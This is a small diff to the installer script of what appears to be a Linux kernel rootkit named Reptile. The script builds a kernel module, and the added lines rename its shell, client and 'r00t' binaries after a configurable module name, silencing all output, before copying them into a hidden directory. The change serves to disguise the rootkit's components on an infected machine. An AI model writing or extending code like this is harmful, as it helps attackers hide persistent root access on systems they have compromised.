@@ -185,6 +185,9 @@ function reptile_install {
 	make all > /dev/null 2>&1 && \
 	make clean > /dev/null 2>&1 && \
 	mv bin/rep_mod bin/$MODULE.ko > /dev/null 2>&1 && \
+	mv bin/reptile_shell bin/$MODULE"_shell" > /dev/null 2>&1 && \
+	mv bin/reptile_client bin/$MODULE"_client" > /dev/null 2>&1 && \
+	mv bin/reptile_r00t bin/$MODULE"_r00t" > /dev/null 2>&1 && \
 	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 
 	echo -n "Copying binaries to /$MODULE... "
